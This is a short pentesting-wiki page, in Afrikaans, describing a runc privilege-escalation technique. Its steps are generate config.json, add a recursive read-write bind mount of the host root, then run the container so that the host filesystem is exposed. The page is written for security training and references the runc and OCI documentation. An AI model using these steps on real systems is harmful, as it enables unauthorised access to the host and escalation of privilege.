# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

As jy meer oor **runc** wil leer, kyk na die volgende bladsy:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

As `runc` vir 'n rootful-proses op die host beskikbaar is, kan jy 'n OCI-bundle gebruik waarvan die mount-konfigurasie die host se `/` rekursief by `/` binne die container bind-mount, wat die host-lêerstelsel in daardie mount namespace blootstel.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Die gedokumenteerde `runc run`-workflow is rootful: runc se eie voorbeelde benoem dit as "run as root." ’n Onbevoorregte gebruiker benodig ’n rootless-konfigurasie soos `runc spec --rootless`, en runc dokumenteer dat user namespaces vir hierdie modus geaktiveer moet wees.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI-nutsding vir die skep en uitvoer van containers](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime-spesifikasie: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Gedeelde subbome](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
